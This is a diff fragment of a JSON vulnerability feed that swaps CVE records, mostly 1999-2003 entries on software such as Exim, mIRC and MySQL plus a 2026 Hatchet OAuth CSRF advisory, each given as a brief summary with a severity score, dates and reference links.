+        "http://www.redhat.com/support/errata/RHSA-2003-297.html",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000736"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0743",
+      "summary": "Heap-based buffer overflow in smtp_in.c for Exim 3 (exim3) before 3.36 and Exim 4 (exim4) before 4.21 may allow remote attackers to execute arbitrary code via an invalid (1) HELO or (2) EHLO argument with a large number of spaces followed by a NULL character and a newline, which is not properly trimmed before the \"(no argument given)\" string is appended to the buffer.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000735",
+        "http://marc.info/?l=bugtraq&m=106252015820395&w=2",
+        "http://marc.info/?l=vuln-dev&m=106264740820334&w=2",
+        "http://packages.debian.org/changelogs/pool/main/e/exim/exim_3.36-13/changelog",
+        "http://packages.debian.org/changelogs/pool/main/e/exim4/exim4_4.34-10/changelog"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0744",
+      "summary": "The fetchnews NNTP client in leafnode 1.9.3 to 1.9.41 allows remote attackers to cause a denial of service (process hang and termination) via certain malformed Usenet news articles that cause fetchnews to hang while waiting for input.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "2003-10-20",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html"
+        "http://archives.neohapsis.com/archives/vulnwatch/2003-q3/",
+        "http://leafnode.sourceforge.net/leafnode-SA-2003-01.txt",
+        "http://marc.info/?l=bugtraq&m=106270038210736&w=2",
+        "http://secunia.com/advisories/9678",
+        "http://www.osvdb.org/6452"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1155",
-      "summary": "RHDaemon in RobinHood 1.1 web server in BeOS r5 pro and earlier allows remote attackers to cause a denial of service via long HTTP request.",
+      "id": "CVE-2002-0229",
+      "summary": "Safe Mode feature (safe_mode) in PHP 3.0 through 4.1.0 allows attackers with access to the MySQL database to bypass Safe Mode access restrictions and read arbitrary files using \"LOAD DATA INFILE LOCAL\" SQL statements.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-16",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101286577109716&w=2",
+        "http://marc.info/?l=bugtraq&m=101304702002321&w=2",
+        "http://marc.info/?l=ntbugtraq&m=101285016125377&w=2",
+        "http://marc.info/?l=ntbugtraq&m=101303065423534&w=2",
+        "http://marc.info/?l=ntbugtraq&m=101303819613337&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0230",
+      "summary": "Cross-site scripting vulnerability in fom.cgi of Faq-O-Matic 2.712 allows remote attackers to execute arbitrary Javascript on other clients via the cmd parameter, which causes the script to be inserted into an error message.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "2002-05-16",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0203.html"
+        "http://marc.info/?l=bugtraq&m=101285834018701&w=2",
+        "http://marc.info/?l=bugtraq&m=101293973111873&w=2",
+        "http://sourceforge.net/mailarchive/forum.php?thread_id=464940&forum_id=6367",
+        "http://www.debian.org/security/2002/dsa-109",
+        "http://marc.info/?l=bugtraq&m=101285834018701&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1156",
-      "summary": "StarOffice 5.2 follows symlinks and sets world-readable permissions for the /tmp/soffice.tmp directory, which allows a local user to read files of the user who is using StarOffice.",
-      "cvssScore": 3.6,
+      "id": "CVE-2002-0231",
+      "summary": "Buffer overflow in mIRC 5.91 and earlier allows a remote server to execute arbitrary code on the client via a long nickname.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-16",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101286747013955&w=2",
+        "http://online.securityfocus.com/archive/1/254105",
+        "http://www.iss.net/security_center/static/8083.php",
+        "http://www.securityfocus.com/bid/4027",
+        "http://www.uuuppz.com/research/adv-001-mirc.htm"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1056",
+      "summary": "Microsoft Outlook 2000 and 2002, when configured to use Microsoft Word as the email editor, does not block scripts that are used while editing email messages in HTML or Rich Text Format (RTF), which could allow remote attackers to execute arbitrary scripts via an email that the user forwards or replies to.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-16",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101760380418890&w=2",
+        "http://online.securityfocus.com/archive/1/265621",
+        "http://www.iss.net/security_center/static/8708.php",
+        "http://www.securityfocus.com/bid/4397",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-021"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1280",
+      "summary": "Memory leak in RealSecure Event Collector 6.5 allows attackers to cause a denial of service (memory consumption and crash).",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-05-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.isskk.co.jp/support/XPressUpdates/RS/RS65ECSR15RNj.html",
+        "http://www.isskk.co.jp/support/XPressUpdates/RS/RS65ECSR15RNj.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1334",
+      "summary": "Block_render_url.class in PHPSlash 0.6.1 allows remote attackers with PHPSlash administrator privileges to read arbitrary files by creating a block and specifying the target file as the source URL.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-05-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0126.html",
+        "http://marc.info/?l=phpslash&m=99029398904419&w=2",
+        "http://www.iss.net/security_center/static/9990.php",
+        "http://www.securityfocus.com/bid/2724",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0126.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-61687",
+      "summary": "### Summary\n\nHatchet version v0.86.26 and below is vulnerable to OAuth state CSRF (login CSRF / account fixation). \n\nThe vulnerable code clears the session `oauth_state_<integration>` value to the empty string `\"\"` after a successful OAuth callback rather than removing the key, and the subsequent state-equality check then accepts an empty `?state=` parameter on any later callback request — allowing an unauthenticated attacker to bind an already-authenticated victim's session cookie to an attacker-controlled OAuth identity (account takeover via login-CSRF). \n\n### Impact\n\nAffected configurations: any deployment that has enabled at least one of `auth.google.enabled`, `auth.github.enabled`, or the Slack integration, and where the victim has completed at least one OAuth flow on that integration in the current session. Bug present on `main` HEAD and in every tagged release up to and including v0.86.26 (commit `243f41d9e1161e70d47dfc0a6509f1c4ddfc9c23`).",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-09-21",
+      "modified": "2026-09-21",
+      "cwe": {
+        "cwe_id": "CWE-287",
+        "name": "Improper Authentication"
+      },
+      "references": [
+        "https://github.com/hatchet-dev/hatchet/security/advisories/GHSA-phg3-3g28-wq9v",
+        "https://github.com/hatchet-dev/hatchet/commit/f90464189ad642251e09412d0f99fde353036428",
+        "https://github.com/advisories/GHSA-phg3-3g28-wq9v"
+      ],
+      "vulnerableProducts": [
+        "hatchet go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-1212",
+      "summary": "Zope 2.2.0 through 2.2.4 does not properly protect a data updating method on Image and File objects, which allows attackers with DTML editing privileges to modify the raw data of these objects.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-12-18",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000365",
+        "http://frontal2.mandriva.com/security/advisories?name=MDKSA-2000:086",
+        "http://www.debian.org/security/2001/dsa-007",
+        "http://www.osvdb.org/6283",
+        "http://www.redhat.com/support/errata/RHSA-2000-135.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0969",
+      "summary": "Buffer overflow in MySQL daemon (mysqld) before 3.23.50, and 4.0 beta before 4.02, on the Win32 platform, allows local users to execute arbitrary code via a long \"datadir\" parameter in the my.ini initialization file, whose permissions on Windows allow Full Control to the Everyone group.",
+      "cvssScore": 7.8,
+      "severity": "High",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": "CWE-120",
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0004.html",
+        "http://marc.info/?l=bugtraq&m=103358628011935&w=2",
+        "http://www.iss.net/security_center/static/10243.php",
+        "http://www.mysql.com/documentation/mysql/bychapter/manual_News.html#News-3.23.x",
+        "http://www.securityfocus.com/bid/5853"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1137",
+      "summary": "Buffer overflow in the Database Console Command (DBCC) that handles user inputs in Microsoft SQL Server 7.0 and 2000, including Microsoft Data Engine (MSDE) 1.0 and Microsoft Desktop Engine (MSDE) 2000, allows attackers to execute arbitrary code via a long SourceDB argument in a \"non-SQL OLEDB data source\" such as FoxPro, a variant of CAN-2002-0644.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.ciac.org/ciac/bulletins/n-003.shtml",
+        "http://www.cisco.com/warp/public/707/cisco-sa-20030126-ms02-061.shtml",
+        "http://www.scan-associates.net/papers/foxpro.txt",
+        "http://www.securityfocus.com/bid/5877",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-056"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0680",
+      "summary": "Windows NT Terminal Server performs extra work when a client opens a new connection but before it is authenticated, allowing for a denial of service.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-08-09",
+      "modified": null,
+      "cwe": "CWE-287",
+      "references": [
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ238600",
+        "http://www.ciac.org/ciac/bulletins/j-057.shtml",
+        "http://www.securityfocus.com/bid/571",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-028",
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ238600"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0813",
+      "summary": "Cfingerd with ALLOW_EXECUTION enabled does not properly drop privileges when it executes a program on behalf of the user, allowing local users to gain root privileges.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1999-08-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0813",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0813"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0694",
+      "summary": "Denial of service in AIX ptrace system call allows local users to crash the system.",
+      "cvssScore": 2.1,
       "severity": "Low",
-      "published": "2001-01-09",
+      "published": "1999-08-11",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0115.html",
-        "http://www.securityfocus.com/bid/1922",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5487",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0115.html",
-        "http://www.securityfocus.com/bid/1922"
+        "http://www.ciac.org/ciac/bulletins/j-055.shtml",
+        "http://www.ciac.org/ciac/bulletins/j-055.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0814",
+      "summary": "Red Hat pump DHCP client allows remote attackers to gain root access in some configurations.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-08-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.redhat.com/support/errata/RHSA-1999-027.html",
+        "http://www.redhat.com/support/errata/RHSA-1999-027.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
